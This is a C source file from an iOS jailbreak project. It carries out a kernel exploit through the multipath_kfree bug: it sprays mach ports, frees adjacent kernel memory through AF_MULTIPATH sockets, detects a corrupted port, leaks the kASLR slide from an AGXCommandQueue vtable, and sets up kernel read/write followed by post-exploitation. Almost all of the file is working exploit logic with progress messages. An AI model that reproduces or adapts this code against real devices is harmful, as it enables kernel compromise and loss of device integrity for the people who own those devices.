//
//  jailbreak.c
//  multipath_kfree
//
//  Created by John Åkerblom on 6/1/18.
//  Copyright © 2018 kjljkla. All rights reserved.
//

#include "jailbreak.h"
#include "extra_recipe_utils.h"
#include "iansploit.h"
#include "multipath_kfree.h"
#include "offsets.h"
#include "postexploit.h"
#include "reboot.h"
#include "simplyhoudini.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

uint64_t kernel_base = 0;

static void _init_port_with_empty_msg(mach_port_t port) {
  uint8_t buf[256];
  memset(buf, 0x00, sizeof(buf));
  prepare_prealloc_port(port);
  send_prealloc_msg(port, (uint64_t *)buf, 30);
}

static int _is_port_corrupt(mach_port_t port) {

  kern_return_t err;
  mach_port_seqno_t msg_seqno = 0;
  mach_msg_size_t msg_size = 0;
  mach_msg_id_t msg_id = 0;
  mach_msg_trailer_t msg_trailer; // NULL trailer
  mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
  err = mach_port_peek(
      mach_task_self(), port, MACH_RCV_TRAILER_NULL, &msg_seqno, &msg_size,
      &msg_id, (mach_msg_trailer_info_t)&msg_trailer, &msg_trailer_size);
  if (err == KERN_FAILURE) {
    printf("Failed to peek.\n");
  }
  if (msg_id && (msg_id != 0x962)) {
    printf("Port %#x is corrupt!\n", port);
    return 1;
  }

  return 0;
}

void jb_go(void) {
  int wantBeer = 1;

  printf("Stage 1: Exploiting the kernel.\n");
  init_offsets();

  if (wantBeer) {
    brewbeer();

    return;
  }

  printf("Initializing multipath_kfree bug...\n");
  io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
  mach_port_t first_ports[FIRST_PORTS_COUNT];
  mach_port_t refill_ports[REFILL_PORTS_COUNT];
  mach_port_t toolazy_ports[TOOLAZY_PORTS_COUNT];
  mach_port_t corrupt_port = 0;
  uint64_t contained_port_addr = 0;
  uint8_t *recv_buf = NULL;
  uint8_t send_buf[1024];

  int mp_socks[MP_SOCK_COUNT];
  int prealloc_size = 0x660; // kalloc.4096
  int found = 0;
  int peeks = 0;

  printf("Filling the zone with 10,000 machports...\n");
  for (int i = 0; i < 10000; ++i) {
    prealloc_port(prealloc_size);
  }

  printf("Filling the zone with another 0x20 machports serving as our first "
         "port for corruption...\n");
  for (int i = 0; i < 0x20; ++i) {
    first_ports[i] = prealloc_port(prealloc_size);
  }

  printf("Creating our first socket...\n");
  mp_socks[0] = socket(AF_MULTIPATH, SOCK_STREAM, 0);
  printf("Our first socket descriptor is: %d\n", mp_socks[0]);

  printf("Filling our the zone and our first port array with the remaining %d "
         "ports...\n",
         FIRST_PORTS_COUNT - 0x20);
  for (int i = 0x20; i < FIRST_PORTS_COUNT; ++i) {
    first_ports[i] = prealloc_port(prealloc_size);
  }

  printf("Creating the rest of our %d sockets...\n", MP_SOCK_COUNT - 1);
  for (int i = 1; i < MP_SOCK_COUNT; ++i) {
    mp_socks[i] = socket(AF_MULTIPATH, SOCK_STREAM, 0);
  }

  printf(
      "Initializing empty messages for all of our potential first ports...\n");
  for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
    _init_port_with_empty_msg(first_ports[i]);
  }

  printf("Freeing first and second in our socket struct and praying that we "
         "are still here...\n");
  multipath_kfree_nearby_self(mp_socks[0], 0x0000 + 0x7a0);
  multipath_kfree_nearby_self(mp_socks[3], 0xe000 + 0x7a0);

  printf("Finding corrupt port in that zone so we can leak the kernel ASLR "
         "shift later...\n");
  for (peeks = 0; peeks < MAX_PEEKS; ++peeks) {
    for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
      if (_is_port_corrupt(first_ports[i])) {
        corrupt_port = first_ports[i];
        printf("Corrupt port: %08X %d\n", corrupt_port, i);
        found = 1;
        break;
      }
    }
    if (peeks == (MAX_PEEKS / 4) && peeks < (MAX_PEEKS / 2)) {
      printf("25%% of the ports checked...\n");
    }

    if (peeks == (MAX_PEEKS / 2)) {
      printf("50%% of the ports checked, are you sure we are gonna make it? "
             "...\n");
    }

    if (found)
      break;
  }

  if (peeks >= MAX_PEEKS) {
    printf("Did not find corrupt port\n");
    sleep(1);
    // panic_now(); //Uncomment if you want to reboot upon failure
    exit(0);
  }

  printf("Filling ports to serve as a zone spray for finding the kASLR slide "
         "and getting r/w...\n");
  for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
    refill_ports[i] = prealloc_port(prealloc_size);
  }

  printf("Initializing empty messages for all of our sprayed ports...\n");
  for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
    _init_port_with_empty_msg(refill_ports[i]);
  }

  printf("Receiving the response message from our corrupt port, leaking the "
         "address of our new contained port...\n");
  recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);

  contained_port_addr = *(uint64_t *)(recv_buf + 0x1C);
  printf("Refill port is at %p\n", (void *)contained_port_addr);

  printf("Sending an empty message to our corrupted port...\n");
  memset(send_buf, 0, sizeof(send_buf));
  send_prealloc_msg(corrupt_port, (uint64_t *)send_buf, 30);

  printf("Freeing the contained port using multipath bug...\n");
  multipath_kfree(contained_port_addr);

  for (;;) {
    if (_is_port_corrupt(corrupt_port)) {
      break;
    }
  }
  printf("Leaking kASLR by filling the zone with userclients to "
         "AGXCommandQueue...\n");
  for (int i = 0; i < REFILL_USERCLIENTS_COUNT; ++i) {
    refill_userclients[i] = alloc_userclient();
  }

  printf("Receiving back from our corrupt port, leaking the address of the "
         "userclient...\n");
  recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);

  printf("Calculating the address of the vtable of AGXCommandQueue from the "
         "leaked userclient...\n");
  uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
  printf("AGXCommandQueue vtable is at: %p\n", (void *)vtable);
  printf("Calculating kaslr_shift, if this displays 0xffff(something) then "
         "check if the vtable offset is correct!\n");
  uint64_t kaslr_shift = vtable - offsets.AGXCommandQueue_vtable;
  printf("kaslr shift: %p\n", (void *)kaslr_shift);

  printf("Destroying the corrupted port as we now have the kASLR slide...\n");
  mach_port_destroy(mach_task_self(), corrupt_port);

  printf("Filling the zone again with some random ports so we can get kernel "
         "read write...\n");
  for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
    toolazy_ports[i] = prealloc_port(
        prealloc_size - 0x28); // Not even really aligned because lazy
  }

  printf("Setting up kernel r/w access using s1guza's gadgets...\n");
  kx_setup(refill_userclients, toolazy_ports, kaslr_shift, contained_port_addr);

  kernel_base = 0xfffffff007004000 + kaslr_shift;
  uint32_t val = kread32(kernel_base);
  printf("Kernel base is at: %#llx and has magic: %#x.\n", kernel_base, val);

  printf("Doing post-exploitation stuff, big thanks to Jonathan Levin...\n");
  post_exploitation(kernel_base, kaslr_shift, 1);

  printf("Done\n");
  for (;;)
    sleep(1);
}
